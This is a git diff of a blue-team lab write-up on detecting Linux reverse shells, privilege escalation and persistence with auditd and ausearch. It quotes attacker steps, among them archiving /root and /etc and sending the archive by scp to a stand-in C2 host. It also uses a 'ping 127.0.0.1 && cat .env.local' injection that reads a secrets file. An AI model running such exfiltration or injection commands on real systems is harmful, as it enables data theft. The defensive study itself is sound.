@@ -33,8 +33,9 @@ Reverse Shell 
 2. Which IP spawned a similar reverse shell via TryPingMe app?  
 - We can run the command ausearch –i –if /home/ubuntu/scenario/audit.log | grep whoami  
 - Or, if already in the directory, you can write ausearch  -i  -if audit.log | whoami  
-    ![[253.png]]
-	Answer: 10.14.105.255 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/253.png)
+
+Answer: 10.14.105.255 
 
 Privilege Escalation Basics  
 
@@ -69,13 +70,15 @@ Detecting Privilege Escalation 
 - Tar czf dump.tar.gz /root /etc/ (Archiving Sensitive Data) 
 - Scp dump.tar.gz attacker@c2-server.thm (Exfiltrating the dAta) 
 
+Questions
+
 1. Which command line was used to look for the “pass” keyword in files?  
 - When an adversary is looking for something in a system, the common commands they will use are find or grep.  
 - In this case the adversary was looking for keyword “pass” 
 - We can use the ausearch command and grep for the keyword pass to find our results.  
 - ausearch –i –if audit.log | grep pass 
-    
-	![[254.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/254.png)
+
 	Answer: grep –iR pass 
 
 2. Which command line was used to escalate privileges to root?  
@@ -84,20 +87,20 @@ Detecting Privilege Escalation 
 - We can start by grep for the type=EXECVE to reduce the output of the information from ausearch) 
 - type=EXECVE: is a record type that logs arguments that are passed to a program during its execution.  
 - Ausearch –i –f audit.log| grep ‘type=EXECVE’ 
-    
-	![[255.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/255.png)
+
 Answer: su root 
 
 3. Looking at the detected .env file, what was the root password?  
 - Let's look for the .env in the audit.log 
 - ausearch –i  -if audit.log | grep .env 
-    
-	![[256.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/256.png) 
 
 - Here we see the command that was use to read the .env.local file 
 - From the previous question that from threat detection 2 with the ip 127.0.0.1 we can access the trypingme web browser and run the ping command 127.0.0.1 && cat .env.local  
-    ![[257.png]]
-	Answer: nGql1pQkGa 
+![alt](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/257.png)
+
+Answer: nGql1pQkGa 
 
 Cron Persistence  
 - Cron jobs are similar to scheduled tasks in Windows.  
@@ -119,33 +122,34 @@ Detecting Persistence  
 - Let look through the audit logs for a malware service that was run  
 - Ausearch –i –f /etc/systemd/system | grep service 
     
-	![[258.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/258.png)
 
 - We see a service called “tux.service” 
-- Lets navigate to the file  
-	
-	 
-![[259.png]]
+- Lets navigate to the file 	
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/259.png)
+
 - Let now execute the service that is shown above “/var/lib/misc/tux” 
-    ![[260.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/260.png)
+  
 	Answer: THM{hidden_penguin!} 
 
 2. What flag did you get after running the malware persistingas a service? 
 - Let look for crontab to see any path that can lead to the flag.  
 - We can use ausearch –i –x crontab 
-    
-	![[261.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/261.png) 
 
 - We find a “cwd” 
 - Let's go to that directory (we may have to sudo su to continue) 
     
-	![[262.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/262.png)
+
 - Here we see reboot file /usr/sbin/phoenix  
 - We then run that file. 
--![[263.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/263.png)
+
 - copy the path to where we found the file.  
-    
-	![[264.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/264.png)
+
 	Answer: THM{ressurect_on_reboot!} 
 
 Account Persistence 
@@ -154,18 +158,19 @@ Account Persistence 
 1. Which user was created and added to the sudo group?  
 - We can navigate to the /var/log directory to have access to the auth.log to determine which user was added. 
 - When a user is added to a group in Linux, the command to do so would be useradd.  
-- We can use command cat auth.log | grep useradd 
-    ![[265.png]]
+- We can use command cat auth.log | grep useradd
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/265.png)
+
 	Answer: koichi 
 
 2. Which file was changed to allow SSH key persistence?  
 - We grep for type=Path to reduce the numerous outputs from just filter ssh.  
 - This will allow us to only view the path of file and be able to determine the file that was changed to allow SSH key persistence.  
 - We can use command ausaerch –i | grep ‘type=PATH’ 
-    
-	![[266.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/266.png) 
 
 - To change a file, there must be root privileges to perform such actions. 
 - Let reduce the output more  
-	![[267.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/267.png)
+
 	Answer: /root/.ssh/authorized_keys
